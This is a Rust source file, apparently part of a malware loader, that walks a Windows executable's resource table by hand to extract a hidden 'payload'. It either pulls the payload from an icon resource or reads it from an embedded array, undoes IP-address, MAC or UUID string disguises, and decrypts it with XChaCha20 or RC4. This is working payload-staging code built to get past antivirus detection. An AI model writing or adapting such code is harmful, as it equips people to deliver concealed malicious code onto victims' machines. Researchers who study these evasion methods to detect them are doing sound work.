use alloc::vec::Vec;
use windows_sys::Win32::System::{
    Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_RESOURCE, IMAGE_NT_HEADERS64},
    SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_RESOURCE_DATA_ENTRY, IMAGE_RESOURCE_DIRECTORY,
        IMAGE_RESOURCE_DIRECTORY_ENTRY,
    },
};

pub unsafe fn get_resource_data(h_module: *mut u8, resource_id: u16) -> Option<Vec<u8>> {
    unsafe {
        if h_module.is_null() {
            return None;
        }

        let base_addr = h_module as *const u8;
        let dos_header = &*(base_addr as *const IMAGE_DOS_HEADER);
        let nt_headers =
            &*(base_addr.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);

        // Locate the resource directory
        let resource_dir_rva = nt_headers.OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_RESOURCE as usize]
            .VirtualAddress; // IMAGE_DIRECTORY_ENTRY_RESOURCE
        if resource_dir_rva == 0 {
            return None; // No resource directory present
        }

        let resource_dir =
            &*(base_addr.add(resource_dir_rva as usize) as *const IMAGE_RESOURCE_DIRECTORY);
        let resource_entries = base_addr
            .add(resource_dir_rva as usize + core::mem::size_of::<IMAGE_RESOURCE_DIRECTORY>());

        // Iterate over resource entries (Type directory)
        let total_entries =
            (resource_dir.NumberOfNamedEntries + resource_dir.NumberOfIdEntries) as usize;
        for i in 0..total_entries {
            let entry = &*(resource_entries
                .add(i * core::mem::size_of::<IMAGE_RESOURCE_DIRECTORY_ENTRY>())
                as *const IMAGE_RESOURCE_DIRECTORY_ENTRY);

            // Check if the entry is a directory
            if entry.Anonymous2.OffsetToData & 0x80000000 == 0 {
                continue; // Not a directory, skip
            }

            // Access second-level directory (Name/ID directory)
            let sub_dir_rva = entry.Anonymous2.OffsetToData & 0x7FFFFFFF;
            let sub_dir = &*(base_addr.add(resource_dir_rva as usize + sub_dir_rva as usize)
                as *const IMAGE_RESOURCE_DIRECTORY);
            let sub_entries = base_addr.add(
                resource_dir_rva as usize
                    + sub_dir_rva as usize
                    + core::mem::size_of::<IMAGE_RESOURCE_DIRECTORY>(),
            );

            // Iterate over sub-entries (Name/ID directory)
            let total_sub_entries =
                (sub_dir.NumberOfNamedEntries + sub_dir.NumberOfIdEntries) as usize;
            for j in 0..total_sub_entries {
                let sub_entry = &*(sub_entries
                    .add(j * core::mem::size_of::<IMAGE_RESOURCE_DIRECTORY_ENTRY>())
                    as *const IMAGE_RESOURCE_DIRECTORY_ENTRY);

                // Check if the subentry matches the resource ID
                if sub_entry.Anonymous1.Id == resource_id {
                    // Check if the subentry is a directory
                    if sub_entry.Anonymous2.OffsetToData & 0x80000000 == 0 {
                        continue; // Not a directory, skip
                    }

                    // Access third-level directory (Language directory)
                    let lang_dir_rva = sub_entry.Anonymous2.OffsetToData & 0x7FFFFFFF;
                    let lang_dir = &*(base_addr
                        .add(resource_dir_rva as usize + lang_dir_rva as usize)
                        as *const IMAGE_RESOURCE_DIRECTORY);
                    let lang_entries = base_addr.add(
                        resource_dir_rva as usize
                            + lang_dir_rva as usize
                            + core::mem::size_of::<IMAGE_RESOURCE_DIRECTORY>(),
                    );

                    // Iterate over language entries
                    let total_lang_entries =
                        (lang_dir.NumberOfNamedEntries + lang_dir.NumberOfIdEntries) as usize;
                    for k in 0..total_lang_entries {
                        let lang_entry = &*(lang_entries
                            .add(k * core::mem::size_of::<IMAGE_RESOURCE_DIRECTORY_ENTRY>())
                            as *const IMAGE_RESOURCE_DIRECTORY_ENTRY);

                        // Check if the langentry points to a data entry
                        if lang_entry.Anonymous2.OffsetToData & 0x80000000 == 0 {
                            let data_entry_rva = lang_entry.Anonymous2.OffsetToData;
                            let data_entry = &*(base_addr
                                .add(resource_dir_rva as usize + data_entry_rva as usize)
                                as *const IMAGE_RESOURCE_DATA_ENTRY);

                            // Extract the resource data
                            let data_ptr = base_addr.add(data_entry.OffsetToData as usize);
                            let size = data_entry.Size as usize;
                            let data = core::slice::from_raw_parts(data_ptr, size);
                            return Some(data.to_vec());
                        }
                    }
                }
            }
        }

        None
    }
}

pub fn get_payload(image_base: *mut u8) -> Vec<u8> {
    let payload_data: Vec<u8>;

    #[cfg(feature = "resource")]
    {
        // Read raw bytes from PE resource (typically `icon.ico`)
        let raw = unsafe { get_resource_data(image_base, 1).expect("Failed to load resource") };

        // If obfuscation is enabled, treat it as UTF-8 encoded obfuscated text
        #[cfg(any(feature = "ipv4", feature = "ipv6", feature = "mac", feature = "uuid"))]
        {
            use shared::obf::*;

            let encoded_str = core::str::from_utf8(&raw).expect("Resource is not valid UTF-8");

            #[cfg(feature = "ipv4")]
            let deobfuscated = deobfuscate_ipv4(encoded_str);

            #[cfg(feature = "ipv6")]
            let deobfuscated = deobfuscate_ipv6(encoded_str);

            #[cfg(feature = "mac")]
            let deobfuscated = deobfuscate_mac(encoded_str);

            #[cfg(feature = "uuid")]
            let deobfuscated = deobfuscate_uuid(encoded_str);

            payload_data = deobfuscated.expect("Failed to deobfuscate resource payload");
        }

        // If no obfuscation, treat it as raw binary
        #[cfg(not(any(feature = "ipv4", feature = "ipv6", feature = "mac", feature = "uuid")))]
        {
            payload_data = raw;
        }
    }

    #[cfg(not(feature = "resource"))]
    {
        #[cfg(any(feature = "ipv4", feature = "ipv6", feature = "mac", feature = "uuid"))]
        {
            use crate::payload::ENCPAYLOAD;
            use shared::obf::*;
            let encoded_str = ENCPAYLOAD.join("\n");

            #[cfg(feature = "ipv4")]
            let deobfuscated = deobfuscate_ipv4(&encoded_str);

            #[cfg(feature = "ipv6")]
            let deobfuscated = deobfuscate_ipv6(&encoded_str);

            #[cfg(feature = "mac")]
            let deobfuscated = deobfuscate_mac(&encoded_str);

            #[cfg(feature = "uuid")]
            let deobfuscated = deobfuscate_uuid(&encoded_str);

            payload_data = deobfuscated.expect("Failed to deobfuscate static payload");
        }

        #[cfg(not(any(feature = "ipv4", feature = "ipv6", feature = "mac", feature = "uuid")))]
        {
            use crate::payload::ENCPAYLOAD;
            payload_data = ENCPAYLOAD.to_vec();
        }
    }

    // Apply decryption if enabled
    #[cfg(feature = "chacha20")]
    {
        use crate::payload::{ENCRYPTION_KEY, ENCRYPTION_NONCE};
        use shared::crypt::{CryptoUtils, XChaCha20Cipher};
        return CryptoUtils::xchacha20_decrypt(&payload_data, ENCRYPTION_KEY, ENCRYPTION_NONCE, 0);
    }

    #[cfg(feature = "rc4")]
    {
        use crate::payload::ENCRYPTION_KEY;
        use shared::crypt::{CryptoUtils, Rc4Cipher};
        return CryptoUtils::rc4_crypt(&payload_data, ENCRYPTION_KEY);
    }

    #[cfg(not(any(feature = "chacha20", feature = "rc4")))]
    {
        return payload_data;
    }
}
